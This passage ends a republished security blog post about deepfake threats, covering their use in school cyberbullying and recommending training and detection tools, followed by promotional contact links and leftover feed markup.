<p>Another aspect that should be taken seriously is the use of deepfakes by school bullies who taunt and harass their peers, target educators or try to depict themselves in situations that are meant to threaten and intimidate others. <a href="https://www.neari.org/advocating-change/new-from-neari/ai-deepfakes-disturbing-trend-school-cyberbullying">This cyberbullying trend</a> is only getting worse over time, and calls on parents to educate children and be very vigilant about potential threats.</p>

<p>Understanding the threat is the first step to defending against it. With more end-user security training and leveraging emerging deepfake detection tools, organizations and individuals can begin to fight back against this new threat.</p>

<p><em>Want to learn more? Contact X-Force experts for a 1:1 briefing and talk about deepfakes, deepfake threats and how your team can train to identify them and thwart threat actors before damage is done.</em></p>

<p><em>Our Cyber Range team invites you to train like you fight at one of our global locations, your offices or virtually. <a href="https://www.ibm.com/services/xforce-cyber-range">Contact us today</a>.</em></p>]]></content><author><name>HC</name></author><category term="research" /><category term="research" /><category term="ai" /><category term="security" /><summary type="html"><![CDATA[Originally posted on IBM Think here: Blog Link]]></summary></entry></feed>